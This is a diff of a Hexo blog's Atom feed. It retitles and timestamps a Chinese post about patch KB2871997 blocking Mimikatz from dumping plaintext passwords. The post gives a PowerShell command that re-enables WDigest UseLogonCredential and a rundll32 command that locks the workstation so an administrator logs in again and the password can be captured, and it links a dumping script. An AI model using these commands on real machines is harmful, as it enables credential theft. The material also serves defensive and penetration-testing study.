@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://sherlocz.github.io/"/>
-  <updated>2020-11-02T15:06:22.183Z</updated>
+  <updated>2020-11-02T15:07:38.931Z</updated>
   <id>http://sherlocz.github.io/</id>
   
   <author>
@@ -17,11 +17,11 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>Mimikatz无法抓取明文密码</title>
+    <title>KB2871997无法抓取明文密码</title>
     <link href="http://sherlocz.github.io/2020/11/02/KB2871997/"/>
     <id>http://sherlocz.github.io/2020/11/02/KB2871997/</id>
     <published>2020-11-02T14:06:53.000Z</published>
-    <updated>2020-11-02T15:06:22.183Z</updated>
+    <updated>2020-11-02T15:07:38.931Z</updated>
     
     <content type="html"><![CDATA[<p>前几天在项目中发现利用mimiakatz无法抓取明文密码，hash又解不出来，pth过去也不行，后来查了资料后发现是打了补丁(<a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" title="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" target="_blank" rel="noopener">KB2871997</a>)的原因。</p><p><img src="/2020/11/02/KB2871997/freebuf.png" alt></p><h1 id="补丁安装"><a href="#补丁安装" class="headerlink" title="补丁安装"></a>补丁安装</h1><p><a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" title="https://www.catalog.update.microsoft.com/Search.aspx?q=KB2871997" target="_blank" rel="noopener">KB2871997</a></p><p>安装好之后运行命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure></p><p>重启计算机，再次利用mimikatz抓取密码:<br><img src="/2020/11/02/KB2871997/reboot.png" alt></p><p>这个时候我们发现只有hash没有明文了，freebuf里说的mimikatz不管用了==</p><h1 id="抓取明文密码"><a href="#抓取明文密码" class="headerlink" title="抓取明文密码"></a>抓取明文密码</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1</span><br></pre></td></tr></table></figure><p>可以将我们之前的 UseLogonCredential 设置成 1，然后注销计算机，等待管理员重新登录就可以抓取明文密码<br>锁屏命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe user32.dll,LockWorkStation</span><br></pre></td></tr></table></figure></p><p>也可以直接使用三好学生的ps脚本：<br><a href="https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed" target="_blank" rel="noopener">https://github.com/3gstudent/Dump-Clear-Password-after-KB2871997-installed</a></p><p>效果如下：<br><img src="/2020/11/02/KB2871997/got.png" alt></p>]]></content>
     
